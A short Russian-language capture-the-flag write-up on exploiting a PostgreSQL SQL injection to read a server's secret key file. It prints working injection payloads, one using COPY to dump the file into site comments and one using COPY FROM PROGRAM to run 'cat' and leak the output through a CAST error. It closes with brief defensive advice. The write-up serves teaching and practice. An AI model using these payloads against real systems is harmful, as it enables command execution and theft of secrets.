# День пятый (Postgres RCE SQL Injection)
-- -
### Цель атаки: 
Получить секретный ключ `/app/secret_key.py`, хранящийся на сервере

### Решение:

Задание было в формате однокомандного CTF. Участникам предлагалось объединиться вместе, чтобы найти уязвимость и
получить секретный ключ. Первым делом необходимо понять, какая используется на сервере база данных и ее версия. 
Затем необходимо было проэксплотировать уязвимость и получить доступ к ключу. Официально решение предполагало 
использование Remote Code Execution, но участникам удалось справиться и без этого

### Итоговый эксплоит:
1) Решение участников: эксплоит копирует содержимое файла secret_key.py в случайную строчку комментариев на сайте,
```sql
lol', '2000-01-01'); COPY comments(text) from '/app/secret_key.py'; insert into users values ('lol
```

2) Авторское решение: позволяет вывести секретный ключ атакующему
```sql
lol', '2000-01-01');
CREATE TABLE cmd_exec(cmd_output text); 
COPY cmd_exec FROM PROGRAM 'cat /app/secret_key';
; insert into users values ('lol
```
```sql
lol', '2000-01-01'); SELECT CAST(cmd_output as DATE) FROM cmd_exec;
```

### Инструменты и полезные ссылки
- Все атаки на PostgreSQL https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md

### Способ защиты
- Отключить инструкцию COPY FROM в настройках базы
- Экранировать пользовательский ввод
